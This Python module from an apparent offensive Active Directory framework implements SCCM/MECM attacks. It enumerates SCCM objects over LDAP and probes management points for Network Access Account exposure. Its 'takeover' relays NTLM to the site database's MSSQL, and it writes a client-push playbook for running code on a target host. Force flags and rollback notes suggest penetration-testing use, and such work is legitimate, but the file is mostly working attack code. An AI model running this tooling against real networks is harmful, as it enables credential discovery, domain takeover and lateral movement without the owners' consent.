"""SCCM/MECM enumeration, NAA recovery, takeover, and client-push."""

from __future__ import annotations

import logging
from typing import Any
from urllib.parse import urljoin

import httpx
from ldap3 import SUBTREE
from rich.console import Console

from adaf_attack.capabilities.capability_catalog import register_from_catalog
from adaf_attack.capabilities.ntlm_relay import NtlmRelay
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_ops import (
    attr_value,
    finish,
    register_advisory_rollback,
    require_force,
    require_param,
)
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()
_logger = logging.getLogger(__name__)

SCCM_FILTER = (
    "(|(objectClass=mSSMSManagementPoint)(objectClass=mSSMSSite)"
    "(objectClass=mSSMSServer)(cn=*System Management*))"
)


def _enum_sccm(conn: Any, base_dn: str) -> list[dict[str, Any]]:
    objects: list[dict[str, Any]] = []
    containers = [base_dn, f"CN=System Management,CN=System,{base_dn}"]
    seen: set[str] = set()
    for search_base in containers:
        try:
            conn.search(
                search_base,
                SCCM_FILTER,
                search_scope=SUBTREE,
                attributes=[
                    "cn",
                    "dNSHostName",
                    "sAMAccountName",
                    "distinguishedName",
                    "mSSMSSiteCode",
                    "mSSMSMPName",
                    "mSSMSVersion",
                    "mSSMSDeviceManagementPoint",
                ],
            )
        except Exception:
            _logger.debug("SCCM LDAP search failed for %s", search_base, exc_info=True)
            continue
        for entry in conn.entries:
            dn = str(attr_value(entry, "distinguishedName") or "")
            if not dn or dn in seen:
                continue
            seen.add(dn)
            objects.append(
                {
                    "cn": str(attr_value(entry, "cn") or ""),
                    "dn": dn,
                    "dns": str(attr_value(entry, "dNSHostName") or "") or None,
                    "site_code": str(attr_value(entry, "mSSMSSiteCode") or "") or None,
                    "mp": str(attr_value(entry, "mSSMSMPName") or "") or None,
                    "version": str(attr_value(entry, "mSSMSVersion") or "") or None,
                }
            )
    return objects


@register_from_catalog("sccm-enum")
class SccmEnum:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        **kwargs: Any,
    ) -> dict[str, Any]:
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            objects = _enum_sccm(conn, base_dn)
            for item in objects:
                if item.get("dns"):
                    graph.add_node(
                        f"SCCM@{item['dns'].upper()}@{target.domain.upper()}",
                        "Computer",
                        dns=item["dns"],
                    )
            result = {"ok": True, "count": len(objects), "objects": objects}
            return finish(session, graph, "sccm-enum", result, count=len(objects))
        finally:
            conn.unbind()


def _http_get(url: str, timeout: float = 5.0) -> tuple[int, str]:
    response = httpx.get(url, timeout=timeout, follow_redirects=True)
    return response.status_code, response.text[:4000]


@register_from_catalog("sccm-naa")
class SccmNaa:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            objects = _enum_sccm(conn, base_dn)
            conn.search(
                base_dn,
                "(|(cn=*NetworkAccessAccount*)(description=*Network Access Account*))",
                search_scope=SUBTREE,
                attributes=["cn", "distinguishedName", "description", "sAMAccountName"],
            )
            ldap_hits = [
                {
                    "cn": str(attr_value(e, "cn") or ""),
                    "dn": str(attr_value(e, "distinguishedName") or ""),
                    "sam": str(attr_value(e, "sAMAccountName") or "") or None,
                    "description": str(attr_value(e, "description") or "") or None,
                }
                for e in conn.entries
            ]
            http_hits: list[dict[str, Any]] = []
            mps = [o.get("dns") or o.get("mp") for o in objects if o.get("dns") or o.get("mp")]
            if kwargs.get("mp"):
                mps.insert(0, str(kwargs["mp"]))
            for mp in dict.fromkeys(str(m) for m in mps if m):
                url = urljoin(f"http://{mp}/", "SMS_MP/.sms_aut?MPKEYINFORMATION")
                try:
                    status, body = _http_get(url)
                except Exception as exc:
                    http_hits.append({"mp": mp, "url": url, "error": str(exc)})
                    continue
                item: dict[str, Any] = {"mp": mp, "url": url, "status": status}
                if include_secrets:
                    item["body"] = body
                if "NetworkAccessAccount" in body or "CCM_NetworkAccessAccount" in body:
                    item["naa_signal"] = True
                    graph.add_edge(
                        f"SCCM@{mp.upper()}@{target.domain.upper()}",
                        f"DOMAIN@{target.domain.upper()}",
                        "SccmNaa",
                    )
                http_hits.append(item)
            result = {
                "ok": True,
                "ldap_hits": ldap_hits,
                "http_hits": http_hits,
                "management_points": list(dict.fromkeys(str(m) for m in mps if m)),
                "naa_decrypted": False,
                "note": (
                    "Reconnaissance only: an NAA signal does not expose credentials. "
                    "Actual NAA recovery requires an SCCM client-policy fetch plus DPAPI "
                    "decryption of the policy blob."
                ),
            }
            return finish(
                session, graph, "sccm-naa", result, ldap=len(ldap_hits), http=len(http_hits)
            )
        finally:
            conn.unbind()


@register_from_catalog("sccm-takeover")
class SccmTakeover:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("sccm-takeover", force)
        site_db = require_param(kwargs, "site_db", "relay_targets", "host")
        relay = NtlmRelay().run(
            target,
            session,
            graph,
            force=True,
            relay_targets=f"mssql://{site_db}",
            duration_seconds=int(kwargs.get("duration_seconds") or 15),
        )
        register_advisory_rollback(
            session,
            kind="ntlm-relay",
            target=str(site_db),
            rollback="Review site-database writes performed via SCCM TAKEOVER-1 relay.",
        )
        result = {"ok": True, "relay": relay, "site_db": site_db}
        return finish(session, graph, "sccm-takeover", result, ok=True)


@register_from_catalog("sccm-client-push")
class SccmClientPush:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("sccm-client-push", force)
        host = require_param(kwargs, "host", "target_host")
        site_code = str(kwargs.get("site_code") or "P01")
        register_advisory_rollback(
            session,
            kind="sccm-push",
            target=host,
            rollback="Remove unauthorized SCCM client-push accounts and staged client installs.",
        )
        playbook = session.path("sccm-client-push.playbook.txt")
        playbook.write_text(
            "# SCCM client-push execution playbook\n"
            f"# Target host: {host}\n"
            f"# Site code: {site_code}\n"
            "# Connect to the SMS Provider WMI namespace root\\sms\\site_"
            f"{site_code} on the site server.\n"
            "# Invoke the client-push against the target using the site server's "
            "client-push account.\n",
            encoding="utf-8",
        )
        result = {
            "ok": False,
            "requested": False,
            "host": host,
            "site_code": site_code,
            "playbook": str(playbook),
            "note": "Client push execution requires a configured SMS Provider session; see playbook.",
        }
        graph.add_edge(
            f"SCCM@{host.upper()}@{target.domain.upper()}",
            f"COMPUTER@{host.upper()}@{target.domain.upper()}",
            "SccmClientPush",
        )
        return finish(session, graph, "sccm-client-push", result, ok=False)
